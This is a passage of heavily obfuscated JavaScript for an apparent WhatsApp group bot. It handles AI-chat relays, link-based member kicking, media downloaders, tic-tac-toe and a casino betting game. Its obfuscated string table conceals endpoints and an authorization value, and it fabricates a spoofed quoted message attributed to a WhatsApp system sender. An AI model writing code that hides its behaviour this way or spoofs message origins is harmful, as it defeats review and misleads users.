                'nama': _0x595ddd,
                'count': 0x1
            }), fs[_0x474715(0x933)](_0x474715(0x6aa), JSON[_0x474715(0x736)](_0xb367c2, null, 0x2))) : (_0xb367c2[_0xd36daf]['db'][_0x2a6cc9][_0x474715(0xaac)] += 0x1, fs[_0x474715(0x933)](_0x474715(0x6aa), JSON['stringify'](_0xb367c2, null, 0x2))));
        }
        async function _0x3bdfda(_0x43921f, _0x530823) {
            const _0x5abc33 = _0x5804c8;
            var _0x5283f7 = null;
            return Object[_0x5abc33(0xafa)](_0x530823)[_0x5abc33(0x9c5)](_0xc481f2 => {
                _0x530823[_0xc481f2]['jid'] === _0x43921f && (_0x5283f7 = _0xc481f2);
            }), _0x5283f7;
        }
        async function _0x1c7aed(_0x48f29d, _0x62a82c, _0x296276) {
            const _0x45fab5 = _0x5804c8;
            _0x160fb2(_0x48f29d, _0x1b1e88[_0x45fab5(0xd13)], _cmdUser);
            var _0x514c04 = null;
            Object['keys'](_0x296276)[_0x45fab5(0x9c5)](_0x554a32 => {
                const _0x12c5bd = _0x45fab5;
                _0x296276[_0x554a32][_0x12c5bd(0x452)] === _0x48f29d && (_0x514c04 = _0x554a32);
            }), _0x514c04 === null ? (_0x296276[_0x45fab5(0x453)]({
                'nama': _0x48f29d,
                'count': 0x1
            }), fs['writeFileSync'](_0x45fab5(0xa07), JSON[_0x45fab5(0x736)](_0x296276, null, 0x2))) : (_0x296276[_0x514c04][_0x45fab5(0xaac)] += 0x1, fs[_0x45fab5(0x933)](_0x45fab5(0xa07), JSON[_0x45fab5(0x736)](_0x296276, null, 0x2)));
        }
        if (_0x1b1e88[_0x5804c8(0xcea)] && isAlreadyResponList(_0x1b1e88[_0x5804c8(0x60f)], _0x3bcaa8[_0x5804c8(0x7bb)](), db_respon_list)) {
            var _0xc678 = getDataResponList(_0x1b1e88['chat'], _0x3bcaa8[_0x5804c8(0x7bb)](), db_respon_list);
            _0xc678[_0x5804c8(0xac4)] === ![] ? _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': sendResponList(_0x1b1e88['chat'], _0x3bcaa8[_0x5804c8(0x7bb)](), db_respon_list)
            }, {
                'quoted': _0x1b1e88
            }) : _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': await getBuffer(_0xc678[_0x5804c8(0x1f2)]),
                'caption': _0xc678['response']
            }, {
                'quoted': _0x1b1e88
            });
        }
        const _0x4cab80 = async (_0x142a2e, _0x1de8fe, _0x27cd78, _0xb55af9, _0x459a27) => {
            const _0x17b739 = _0x5804c8;
            let _0x225bba = '',
                _0x3676e7 = await axios['head'](_0x1de8fe);
            _0x225bba = _0x3676e7['headers']['content-type'];
            if (_0x225bba[_0x17b739(0x4bd)]('/')[0x1] === _0x17b739(0x79a)) return _0x614da8[_0x17b739(0x938)](_0x1b1e88[_0x17b739(0x60f)], {
                'video': await getBuffer(_0x1de8fe),
                'caption': _0x27cd78,
                'gifPlayback': !![],
                'mentions': _0x459a27 ? _0x459a27 : [],
                'mimetype': _0x17b739(0x280)
            }, {
                'quoted': _0x1b1e88
            });
            let _0x15b5c7 = _0x225bba[_0x17b739(0x4bd)]('/')[0x0] + _0x17b739(0x1fc);
            if (_0x225bba === _0x17b739(0x6be)) return _0x614da8[_0x17b739(0x938)](_0x1b1e88[_0x17b739(0x60f)], {
                'document': await getBuffer(_0x1de8fe),
                'mimetype': _0x17b739(0x6be),
                'caption': _0x27cd78,
                'mentions': _0x459a27 ? _0x459a27 : []
            }, {
                'quoted': _0x1b1e88
            });
            if (_0x225bba[_0x17b739(0x4bd)]('/')[0x0] === 'image') return _0x614da8[_0x17b739(0x938)](_0x1b1e88[_0x17b739(0x60f)], {
                'image': await getBuffer(_0x1de8fe),
                'caption': _0x27cd78,
                'mentions': _0x459a27 ? _0x459a27 : []
            }, {
                'quoted': _0x1b1e88
            });
            if (_0x225bba[_0x17b739(0x4bd)]('/')[0x0] === _0x17b739(0x7f5)) return _0x614da8[_0x17b739(0x938)](_0x1b1e88['chat'], {
                'video': await getBuffer(_0x1de8fe),
                'caption': _0x27cd78,
                'mentions': _0x459a27 ? _0x459a27 : [],
                'mimetype': _0x17b739(0x280)
            }, {
                'quoted': _0x1b1e88
            });
            if (_0x225bba[_0x17b739(0x4bd)]('/')[0x0] === _0x17b739(0x428)) return _0x614da8[_0x17b739(0x938)](_0x1b1e88[_0x17b739(0x60f)], {
                'audio': await getBuffer(_0x1de8fe),
                'caption': _0x27cd78,
                'mentions': _0x459a27 ? _0x459a27 : [],
                'mimetype': _0x17b739(0x8d4)
            }, {
                'quoted': _0x1b1e88
            });
        };
        if (!_0x1b1e88[_0x5804c8(0x2a9)][_0x5804c8(0xcbd)] && _0x932571['autoread']) {
            const _0x189f4c = {
                'remoteJid': _0x1b1e88[_0x5804c8(0x60f)],
                'id': _0x1b1e88[_0x5804c8(0x2a9)]['id'],
                'participant': _0x1b1e88['isGroup'] ? _0x1b1e88[_0x5804c8(0x2a9)][_0x5804c8(0xc5a)] : undefined
            };
            await _0x614da8['readMessages']([_0x189f4c]);
        }
        _0x614da8[_0x5804c8(0x593)](_0x5804c8(0xaa3), _0x1b1e88[_0x5804c8(0x60f)]);
        _0x201454 && !_0x50c0d9 && (pendaftar[_0x5804c8(0x453)](_0x1b1e88['sender']), fs[_0x5804c8(0x933)]('./database/user.json', JSON[_0x5804c8(0x736)](pendaftar, null, 0x2)));
        if (_0x1b1e88[_0x5804c8(0xd13)][_0x5804c8(0xac2)](_0x5804c8(0x863)) && _0x932571[_0x5804c8(0x1a5)] === !![]) return _0x614da8[_0x5804c8(0x80f)](_0x1b1e88[_0x5804c8(0xd13)], _0x5804c8(0x83e));
        !_0x1b1e88[_0x5804c8(0xcea)] && !_0x1b1e88[_0x5804c8(0x2a9)][_0x5804c8(0xcbd)] && _0x932571[_0x5804c8(0xc74)] && !_0x201454 && (simi = await fetchJson('https://api.simsimi.net/v2/?lc=id&cf=false&text=' + _0x453fc1), _0x358f3b('_' + simi[_0x5804c8(0xad2)] + '_'));
        if (!_0x1b1e88[_0x5804c8(0xcea)] && !_0x1b1e88['key'][_0x5804c8(0xcbd)] && (_0x139b1f || _0x932571[_0x5804c8(0x20c)]) && !_0x201454) try {
            let _0x4b9fda = [{
                    'role': _0x5804c8(0x95c),
                    'content': _0x5804c8(0xc12)
                }, {
                    'role': 'user',
                    'content': _0x1b04cf
                }],
                _0x39f104 = (await axios[_0x5804c8(0x5ae)]('https://skizo.tech/api/openai?apikey=' + _0x932571[_0x5804c8(0x342)], {
                    'messages': _0x4b9fda
                }))[_0x5804c8(0x233)],
                _0x2fb858 = '' + _0x39f104[_0x5804c8(0x6b2)];
            _0x358f3b(_0x2fb858);
        } catch (_0x11cb72) {
            _0x358f3b(_0x5804c8(0x884));
        }
        if (_0x1b1e88[_0x5804c8(0xcea)] && !_0x1b1e88[_0x5804c8(0x2a9)][_0x5804c8(0xcbd)] && (_0x54303b || _0x932571[_0x5804c8(0x172)]) && !_0x201454) try {
            let _0xdec31b = [{
                    'role': _0x5804c8(0x95c),
                    'content': _0x5804c8(0xc12)
                }, {
                    'role': 'user',
                    'content': _0x1b04cf
                }],
                _0x263d43 = (await axios['post'](_0x5804c8(0x1c2) + _0x932571[_0x5804c8(0x342)], {
                    'messages': _0xdec31b
                }))['data'],
                _0xd91a19 = '' + _0x263d43[_0x5804c8(0x6b2)];
            _0x358f3b(_0xd91a19);
        } catch (_0x578bf6) {
            _0x358f3b(_0x5804c8(0x884));
        }
        if (_0x227ca0) {
            if (_0x22c514[_0x5804c8(0x98b)](_0x5804c8(0x45f))) {
                _0x358f3b(_0x5804c8(0xa27));
                if (!_0x2ab1a1) return _0x358f3b('Anjir lupa gw bukan admin');
                let _0x163898 = _0x5804c8(0x95f) + await _0x614da8['groupInviteCode'](_0x1b1e88['chat']);
                await _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                    'delete': _0x1b1e88[_0x5804c8(0x2a9)]
                });
                let _0xe4deb7 = new RegExp(_0x163898, 'i'),
                    _0x514a74 = _0xe4deb7[_0x5804c8(0xbaa)](_0x1b1e88[_0x5804c8(0x73c)]);
                if (_0x514a74) return _0x358f3b(_0x5804c8(0x377));
                if (_0x155c75) return _0x358f3b(_0x5804c8(0x4cb));
                if (_0x7b6ab6) return _0x358f3b('Gajadi, Kamu ownerku');
                await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'delete': {
                        'remoteJid': _0x1b1e88[_0x5804c8(0x60f)],
                        'fromMe': ![],
                        'id': _0x1b1e88[_0x5804c8(0x2a9)]['id'],
                        'participant': _0x1b1e88['key']['participant']
                    }
                }), _0x614da8['groupParticipantsUpdate'](_0x1b1e88[_0x5804c8(0x60f)], [_0x1b1e88[_0x5804c8(0xd13)]], 'remove');
            }
        }
        if (_0x327d5f) {
            if (_0x22c514[_0x5804c8(0x98b)]('tiktok.com')) {
                _0x358f3b('*「 GROUP LINK DETECTOR 」*\x0a\x0aSepertinya kamu mengirimkan link tiktok, maaf kamu akan di kick');
                if (!_0x2ab1a1) return _0x358f3b(_0x5804c8(0xb1e));
                if (_0x155c75) return _0x358f3b('Gajadi, kamu admin');
                if (_0x7b6ab6) return _0x358f3b(_0x5804c8(0xa4b));
                await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'delete': {
                        'remoteJid': _0x1b1e88[_0x5804c8(0x60f)],
                        'fromMe': ![],
                        'id': _0x1b1e88[_0x5804c8(0x2a9)]['id'],
                        'participant': _0x1b1e88[_0x5804c8(0x2a9)][_0x5804c8(0xc5a)]
                    }
                }), _0x614da8['groupParticipantsUpdate'](_0x1b1e88[_0x5804c8(0x60f)], [_0x1b1e88[_0x5804c8(0xd13)]], _0x5804c8(0x61d));
            }
        }
        if (_0x1b1e88['isGroup'] && !_0x1b1e88[_0x5804c8(0x2a9)][_0x5804c8(0xcbd)] && _0x1e9068 && !_0x201454) try {
            if (_0x22c514['match'](_0x5804c8(0xb06))) {
                _0x358f3b('*「 LINK INSTAGRAM TERDETEKSI 」*\x0a\x0aTunggu sebentar, mendownload file...');
                let _0x4bc724 = await fetchJson(_0x5804c8(0x33d) + _0x22c514 + '&apikey=' + _0x932571['BotKey']);
                _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'video': {
                        'url': _0x4bc724[_0x5804c8(0x6b2)][_0x5804c8(0xbf3)]
                    },
                    'caption': _0x5804c8(0x6ec)
                }, {
                    'quoted': _0x1b1e88
                });
            } else {
                if (_0x22c514[_0x5804c8(0x98b)]('tiktok.com')) {
                    _0x358f3b('*「 LINK TIKTOK TERDETEKSI 」*\x0a\x0aTunggu sebentar, mendownload file...');
                    let _0x27af53 = await fetchJson(_0x5804c8(0x90d) + _0x932571[_0x5804c8(0xc67)] + _0x5804c8(0xa09) + _0x22c514);
                    _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                        'video': {
                            'url': _0x27af53[_0x5804c8(0x6b2)][_0x5804c8(0x55d)]
                        },
                        'caption': _0x5804c8(0x6ec)
                    }, {
                        'quoted': _0x1b1e88
                    });
                } else {
                    if (_0x22c514[_0x5804c8(0x98b)](_0x5804c8(0xd01))) {
                        _0x358f3b(_0x5804c8(0xc93));
                        let _0x2e8e84 = await fetchJson(_0x5804c8(0x951) + _0x22c514);
                        _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                            'video': {
                                'url': _0x2e8e84['result'][_0x5804c8(0x6af)]
                            },
                            'caption': _0x5804c8(0x6ec)
                        }, {
                            'quoted': _0x1b1e88
                        });
                    } else {
                        if (_0x22c514[_0x5804c8(0x98b)](_0x5804c8(0x773))) {
                            _0x358f3b('*「 LINK YOUTUBE TERDETEKSI 」*\x0a\x0aTunggu sebentar, mendownload file...');
                            let _0x566a85 = await fetchJson(_0x5804c8(0xc2e) + _0x22c514),
                                _0x397e5e = await fetchJson(_0x5804c8(0x2f4) + _0x22c514);
                            const _0x382fbc = _0x397e5e[_0x5804c8(0x6b2)][_0x5804c8(0x6b2)],
                                _0x245bcd = _0x566a85['result'][_0x5804c8(0xcec)],
                                _0x293bff = _0x566a85[_0x5804c8(0x6b2)]['title'];
                            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                                'video': {
                                    'url': _0x566a85[_0x5804c8(0x6b2)][_0x5804c8(0x223)][_0x5804c8(0x233)]
                                },
                                'caption': '💬Judul : ' + _0x293bff + _0x5804c8(0x350) + _0x245bcd
                            }, {
                                'quoted': _0x1b1e88
                            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                                'audio': {
                                    'url': _0x382fbc
                                },
                                'mimetype': _0x5804c8(0x8d4)
                            }, {
                                'quoted': _0x1b1e88
                            });
                        }
                    }
                }
            }
        } catch (_0x39bd53) {
            _0x358f3b(_0x5804c8(0x8bc));
        }
        if (_0x4ca01d) {
            if (_0x22c514[_0x5804c8(0x98b)](_0x5804c8(0x407))) {
                await _0x358f3b(_0x5804c8(0x323));
                if (!_0x2ab1a1) return _0x358f3b(_0x5804c8(0xb1e));
                if (_0x155c75) return _0x358f3b(_0x5804c8(0xa34));
                if (_0x7b6ab6) return _0x358f3b(_0x5804c8(0xa34));
                _0x358f3b(_0x5804c8(0x783)), _0x614da8[_0x5804c8(0x1b2)](_0x1b1e88[_0x5804c8(0x60f)], [_0x1b1e88['sender']], _0x5804c8(0x61d));
            }
        }
        if (_0x1b1e88[_0x5804c8(0xcea)] && _0x2e0069) {
            if (!_0x155c75 && !_0x7b6ab6) return;
        }
        if (_0x49fc0c) {
            if (_0x22c514[_0x5804c8(0x98b)](_0x5804c8(0x359) && 'Wa.me')) {
                _0x358f3b(_0x5804c8(0x73e));
                if (!_0x2ab1a1) return _0x358f3b(_0x5804c8(0xb1e));
                await _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                    'delete': _0x1b1e88['key']
                });
                if (_0x155c75) return _0x358f3b(_0x5804c8(0x4cb));
                if (_0x7b6ab6) return _0x358f3b(_0x5804c8(0x2da));
                await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'delete': {
                        'remoteJid': _0x1b1e88[_0x5804c8(0x60f)],
                        'fromMe': ![],
                        'id': _0x1b1e88[_0x5804c8(0x2a9)]['id'],
                        'participant': _0x1b1e88[_0x5804c8(0x2a9)][_0x5804c8(0xc5a)]
                    }
                }), _0x614da8[_0x5804c8(0x1b2)](_0x1b1e88[_0x5804c8(0x60f)], [_0x1b1e88['sender']], _0x5804c8(0x61d));
            }
        }
        if (_0x1b1e88[_0x5804c8(0xcea)] && _0xffcce2 && !_0x7b6ab6 && !_0x155c75 && _0x2ab1a1) {
            if (_0x22c514[_0x5804c8(0x98b)](_0x5804c8(0x359))) {
                if (!_0x2ab1a1) return;
                await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'delete': {
                        'remoteJid': _0x1b1e88[_0x5804c8(0x60f)],
                        'fromMe': ![],
                        'id': _0x1b1e88[_0x5804c8(0x2a9)]['id'],
                        'participant': _0x1b1e88[_0x5804c8(0x2a9)][_0x5804c8(0xc5a)]
                    }
                });
            }
        }
        if (_0x1afa47 && _0x1b1e88[_0x5804c8(0x278)][_0x5804c8(0xc4a)] && _0x1b1e88['msg'][_0x5804c8(0xc4a)][_0x5804c8(0xa6e)](_0x5804c8(0x77e)) in db[_0x5804c8(0x233)][_0x5804c8(0xc70)]) {
            let _0x2a2c60 = db['data'][_0x5804c8(0xc70)][_0x1b1e88[_0x5804c8(0x278)]['fileSha256']['toString']('base64')],
                {
                    text: _0x3aa055,
                    mentionedJid: _0x398251
                } = _0x2a2c60,
                _0x1db0bc = await generateWAMessage(_0x1b1e88[_0x5804c8(0x60f)], {
                    'text': _0x3aa055,
                    'mentions': _0x398251
                }, {
                    'userJid': _0x614da8[_0x5804c8(0x610)]['id'],
                    'quoted': _0x1b1e88[_0x5804c8(0x6a4)] && _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0x314)]
                });
            _0x1db0bc['key'][_0x5804c8(0xcbd)] = areJidsSameUser(_0x1b1e88['sender'], _0x614da8[_0x5804c8(0x610)]['id']), _0x1db0bc['key']['id'] = _0x1b1e88[_0x5804c8(0x2a9)]['id'], _0x1db0bc[_0x5804c8(0x243)] = _0x1b1e88[_0x5804c8(0x243)];
            if (_0x1b1e88['isGroup']) _0x1db0bc[_0x5804c8(0xc5a)] = _0x1b1e88[_0x5804c8(0xd13)];
            let _0x22ab2f = {
                ..._0xd612d5,
                'messages': [proto[_0x5804c8(0x1d3)][_0x5804c8(0xd64)](_0x1db0bc)],
                'type': _0x5804c8(0x189)
            };
            _0x614da8['ev']['emit'](_0x5804c8(0x4c3), _0x22ab2f);
        }
        async function _0x358f3b(_0x450676) {
            const _0x3b37c9 = _0x5804c8,
                _0x4f5743 = {
                    'contextInfo': {
                        'mentionedJid': [_0x1b1e88[_0x3b37c9(0xd13)]],
                        'externalAdReply': {
                            'showAdAttribution': !![],
                            'title': _0x2eeea8,
                            'body': '' + _0x32b235,
                            'previewType': 'PHOTO',
                            'thumbnailUrl': _0xfc3dc4,
                            'sourceUrl': _0x3b4ae4
                        }
                    },
                    'text': _0x450676
                };
            return _0x614da8['sendMessage'](_0x1b1e88[_0x3b37c9(0x60f)], _0x4f5743, {
                'quoted': _0x1b1e88
            });
        }
        async function _0x140b4b(_0x170a30, _0x5aa0b6) {
            const _0x45ebd9 = _0x5804c8;
            let _0xbbe1dd = (await axios(_0x45ebd9(0x880) + encodeURIComponent(_0x45ebd9(0xd2d) + _0x170a30 + _0x45ebd9(0x318) + _0x5aa0b6) + '&hl=id'))[_0x45ebd9(0x233)],
                _0x3c8396 = cheerio[_0x45ebd9(0x74b)](_0xbbe1dd),
                _0x5ab3ee = {},
                _0x590b27 = _0xbbe1dd[_0x45ebd9(0x4bd)](_0x45ebd9(0xd6c))?. [0x1]?. [_0x45ebd9(0x4bd)]('\'')?. [0x0];
            return _0x5ab3ee[_0x45ebd9(0x8f7)] = /^data:.*?\/.*?;base64,/i [_0x45ebd9(0xbaa)](_0x590b27) ? Buffer['from'](_0x590b27[_0x45ebd9(0x4bd)]
                `,` [0x1], _0x45ebd9(0x77e)) : '', _0x5ab3ee['desc'] = _0x3c8396(_0x45ebd9(0x158))['text']()?. ['trim'](), _0x5ab3ee;
        }
        async function _0x401809(_0x445350) {
            const _0x57850e = _0x5804c8,
                _0x5867c1 = await fetch(_0x57850e(0x54d), {
                    'headers': {
                        'Authorization': _0x57850e(0x2f9)
                    },
                    'method': _0x57850e(0x357),
                    'body': JSON[_0x57850e(0x736)](_0x445350)
                }),
                _0x2c21a3 = await _0x5867c1[_0x57850e(0x8c6)]();
            let _0x4bb384 = await _0x2c21a3[_0x57850e(0x597)]();
            const _0x34af20 = Buffer[_0x57850e(0x44e)](_0x4bb384, _0x57850e(0x77e));
            return _0x34af20;
        }
        async function _0x33c05f(_0x4f1525, _0x47f093) {
            return new Promise(async (_0xe705a4, _0x1be1c3) => {
                const _0x269492 = _0x2dbd;
                let _0x15ad2d = [_0x269492(0x94a), _0x269492(0x484), 'dehaze'];
                _0x15ad2d[_0x269492(0x34b)](_0x47f093) ? _0x47f093 = _0x47f093 : _0x47f093 = _0x15ad2d[0x0];
                let _0x1c1c91, _0x4a73a9 = new FormData(),
                    _0x2cfda6 = _0x269492(0x221) + '://' + _0x269492(0x40c) + _0x269492(0x78f) + _0x269492(0x16c) + _0x47f093;
                _0x4a73a9[_0x269492(0x189)](_0x269492(0x703), 0x1, {
                    'Content-Transfer-Encoding': _0x269492(0x412),
                    'contentType': _0x269492(0xd50)
                }), _0x4a73a9[_0x269492(0x189)](_0x269492(0x63e), Buffer[_0x269492(0x44e)](_0x4f1525), {
                    'filename': 'enhance_image_body.jpg',
                    'contentType': _0x269492(0x26e)
                }), _0x4a73a9[_0x269492(0x965)]({
                    'url': _0x2cfda6,
                    'host': 'inferenceengine' + _0x269492(0x78f) + _0x269492(0x55b),
                    'path': '/' + _0x47f093,
                    'protocol': _0x269492(0xd60),
                    'headers': {
                        'User-Agent': _0x269492(0x567),
                        'Connection': _0x269492(0xb12),
                        'Accept-Encoding': _0x269492(0x9e1)
                    }
                }, function (_0x5169c6, _0x5eb760) {
                    const _0x230d89 = _0x269492;
                    if (_0x5169c6) _0x1be1c3();
                    let _0x39a870 = [];
                    _0x5eb760['on']('data', function (_0x336407, _0x5a6d14) {
                        const _0x81256e = _0x2dbd;
                        _0x39a870[_0x81256e(0x453)](_0x336407);
                    })['on'](_0x230d89(0x9be), () => {
                        const _0x38caa8 = _0x230d89;
                        _0xe705a4(Buffer[_0x38caa8(0x530)](_0x39a870));
                    }), _0x5eb760['on'](_0x230d89(0x5d2), _0x3deea0 => {
                        _0x1be1c3();
                    });
                });
            });
        }
        async function _0x40d7a3() {
            const _0x5b47da = _0x5804c8;
            var _0xfebcf4 = [_0x5b47da(0x333), 'ʟᴏᴀᴅɪɴɢ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ...', _0x5b47da(0x333), _0x5b47da(0x333), '《 █▒▒▒▒▒▒▒▒▒▒▒》10%', '《 █▒▒▒▒▒▒▒▒▒▒▒》10%', '《 ████▒▒▒▒▒▒▒▒》30%', _0x5b47da(0x1b4), _0x5b47da(0xbfb), _0x5b47da(0xbfb), '《 ██████████▒▒》80%', _0x5b47da(0xa83), _0x5b47da(0xd27), _0x5b47da(0xd27), _0x5b47da(0x624)];
            let {
                key: _0xe09fc2
            } = await _0x614da8[_0x5b47da(0x938)](_0x1b1e88[_0x5b47da(0x60f)], {
                'text': _0x5b47da(0x333)
            });
            for (let _0x41cbe9 = 0x0; _0x41cbe9 < _0xfebcf4[_0x5b47da(0x977)]; _0x41cbe9++) {
                await _0x614da8[_0x5b47da(0x938)](_0x1b1e88[_0x5b47da(0x60f)], {
                    'text': _0xfebcf4[_0x41cbe9],
                    'edit': _0xe09fc2
                });
            }
        }
        const _0x4ac503 = {
            'key': {
                'fromMe': [],
                'participant': '0@s.whatsapp.net',
                ..._0x1b1e88['chat'] ? {
                    'remoteJid': ''
                } : {}
            },
            'message': {
                'stickerMessage': {
                    'url': _0x5804c8(0xa97),
                    'fileSha256': _0x5804c8(0x717),
                    'fileEncSha256': _0x5804c8(0x1c3),
                    'mediaKey': _0x5804c8(0x35c),
                    'mimetype': _0x5804c8(0x93a),
                    'height': 0x28,
                    'width': 0x28,
                    'directPath': _0x5804c8(0xc4b),
                    'fileLength': _0x5804c8(0x9bb),
                    'mediaKeyTimestamp': _0x5804c8(0x12d),
                    'isAnimated': []
                }
            }
        };
        this[_0x5804c8(0x168)] = this[_0x5804c8(0x168)] ? this[_0x5804c8(0x168)] : {};
        let _0x47588b = Object[_0x5804c8(0x960)](this[_0x5804c8(0x168)])[_0x5804c8(0x958)](_0x2c957d => _0x2c957d['id'] && _0x2c957d[_0x5804c8(0x168)] && _0x2c957d[_0x5804c8(0xcdc)] && _0x2c957d['id'][_0x5804c8(0xac2)](_0x5804c8(0x6cb)) && [_0x2c957d[_0x5804c8(0x168)][_0x5804c8(0x5c7)], _0x2c957d[_0x5804c8(0x168)][_0x5804c8(0x4cf)]][_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0xd13)]) && _0x2c957d[_0x5804c8(0xcdc)] == _0x5804c8(0x2d0));
        if (_0x47588b) {
            let _0x2f99a7, _0x464490 = !0x1,
                _0x5436af = !0x1,
                _0x3c6509 = !0x1;
            if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i [_0x5804c8(0xbaa)](_0x1b1e88['text'])) return;
            _0x3c6509 = !/^[1-9]$/ ['test'](_0x1b1e88['text']);
            if (_0x1b1e88[_0x5804c8(0xd13)] !== _0x47588b[_0x5804c8(0x168)][_0x5804c8(0xc1b)]) {
                if (!_0x3c6509) return !0x0;
            }
            if (!_0x3c6509 && 0x1 > (_0x2f99a7 = _0x47588b[_0x5804c8(0x168)]['turn'](_0x1b1e88[_0x5804c8(0xd13)] === _0x47588b[_0x5804c8(0x168)][_0x5804c8(0x4cf)], parseInt(_0x1b1e88[_0x5804c8(0x73c)]) - 0x1))) return _0x358f3b({
                '-3': _0x5804c8(0x281),
                '-2': 'Invalid',
                '-1': _0x5804c8(0x71c),
                0x0: 'Posisi Invalid'
            } [_0x2f99a7]), !0x0;
            if (_0x1b1e88[_0x5804c8(0xd13)] === _0x47588b[_0x5804c8(0x168)]['winner']) _0x464490 = !![];
            else {
                if (_0x47588b['game']['board'] === 0x1ff) _0x5436af = !![];
            }
            let _0x25a3e4 = _0x47588b[_0x5804c8(0x168)][_0x5804c8(0x3dc)]()['map'](_0x4441ea => {
                const _0x15bc6b = _0x5804c8;
                return {
                    'X': '❌',
                    'O': '⭕',
                    0x1: _0x15bc6b(0x5f3),
                    0x2: _0x15bc6b(0xb87),
                    0x3: _0x15bc6b(0x6d0),
                    0x4: _0x15bc6b(0x999),
                    0x5: _0x15bc6b(0x2e1),
                    0x6: _0x15bc6b(0x1ae),
                    0x7: '7️⃣',
                    0x8: _0x15bc6b(0x516),
                    0x9: _0x15bc6b(0x2b4)
                } [_0x4441ea];
            });
            _0x3c6509 && (_0x47588b[_0x5804c8(0x168)]['_currentTurn'] = _0x1b1e88[_0x5804c8(0xd13)] === _0x47588b[_0x5804c8(0x168)][_0x5804c8(0x5c7)], _0x464490 = !![]);
            let _0x125b26 = _0x3c6509 ? _0x47588b[_0x5804c8(0x168)][_0x5804c8(0xc1b)] : _0x47588b['game'][_0x5804c8(0x14d)],
                _0x4d5521 = _0x5804c8(0xae1) + _0x47588b['id'] + '\x0a\x0a' + _0x25a3e4[_0x5804c8(0x7af)](0x0, 0x3)[_0x5804c8(0xc6c)]('') + '\x0a' + _0x25a3e4[_0x5804c8(0x7af)](0x3, 0x6)[_0x5804c8(0xc6c)]('') + '\x0a' + _0x25a3e4['slice'](0x6)['join']('') + '\x0a\x0a' + (_0x464490 ? '@' + _0x125b26['split']('@')[0x0] + _0x5804c8(0x492) : _0x5436af ? _0x5804c8(0x15c) : 'Giliran ' + ['❌', '⭕'][0x1 * _0x47588b['game']['_currentTurn']] + _0x5804c8(0xd57) + _0x47588b[_0x5804c8(0x168)][_0x5804c8(0xc1b)][_0x5804c8(0x4bd)]('@')[0x0] + ')') + _0x5804c8(0x2f2) + _0x47588b['game']['playerX'][_0x5804c8(0x4bd)]('@')[0x0] + _0x5804c8(0x206) + _0x47588b[_0x5804c8(0x168)]['playerO'][_0x5804c8(0x4bd)]('@')[0x0] + _0x5804c8(0x27a);
            if ((_0x47588b[_0x5804c8(0x168)][_0x5804c8(0x2f8)] ^ _0x3c6509 ? _0x47588b['x'] : _0x47588b['o']) !== _0x1b1e88[_0x5804c8(0x60f)]) _0x47588b[_0x47588b[_0x5804c8(0x168)]['_currentTurn'] ^ _0x3c6509 ? 'x' : 'o'] = _0x1b1e88[_0x5804c8(0x60f)];
            if (_0x47588b['x'] !== _0x47588b['o']) await _0x614da8[_0x5804c8(0x4aa)](_0x47588b['x'], _0x4d5521, _0x1b1e88, {
                'mentions': parseMention(_0x4d5521)
            });
            await _0x614da8[_0x5804c8(0x4aa)](_0x47588b['o'], _0x4d5521, _0x1b1e88, {
                'mentions': parseMention(_0x4d5521)
            }), (_0x5436af || _0x464490) && delete this[_0x5804c8(0x168)][_0x47588b['id']];
        }
        if (fs[_0x5804c8(0xb82)]('./database/casino/' + _0x1b1e88[_0x5804c8(0x60f)] + _0x5804c8(0x6e9))) {
            var _0x4286a2 = setCasino('' + _0x1b1e88[_0x5804c8(0x60f)]);
            _0x1b1e88[_0x5804c8(0xd13)] == '' + _0x4286a2['Y'] && _0x22c514[_0x5804c8(0x7bb)]() == 'n' && (_0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x5804c8(0x4e0) + _0x4286a2['Y']['split']('@')[0x0] + _0x5804c8(0x5a9),
                'mentions': [_0x4286a2['Y']]
            }, {
                'quoted': _0x1b1e88
            }), deleteCasino(_0x1b1e88[_0x5804c8(0x60f)]));
            if (_0x1b1e88[_0x5804c8(0xd13)] == '' + _0x4286a2['Y'] && _0x22c514['toLowerCase']() == 'y') {
                var _0x43889a = await _0x123af8(0xa, 0x14),
                    _0x521388 = await _0x123af8(0xa, 0x14);
                if (_0x43889a > _0x521388) _0x5e1627 = '🎰 Casino Game 💰\x0a\x0a• @' + _0x4286a2['Z'] + _0x5804c8(0x9a7) + _0x43889a + _0x5804c8(0xa67) + _0x4286a2['Y']['split']('@')[0x0] + ' --> ' + _0x521388 + _0x5804c8(0x5b5) + _0x4286a2['Z'] + ' ]\x0aMendapatkan: $ ' + _0x3d6aee(_0x4286a2[_0x5804c8(0x264)]), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'text': _0x5e1627,
                    'mentions': [_0x4286a2['Z'] + _0x5804c8(0x7cd), _0x4286a2['Y']]
                }, {
                    'quoted': _0x1b1e88
                }), await addBalance(_0x4286a2['Z'] + _0x5804c8(0x7cd), _0x3d6aee(_0x4286a2['nominal']), balance), await kurangBalance('' + _0x4286a2['Y'], _0x3d6aee(_0x4286a2[_0x5804c8(0x264)]), balance), deleteCasino(_0x1b1e88[_0x5804c8(0x60f)]);
                else {
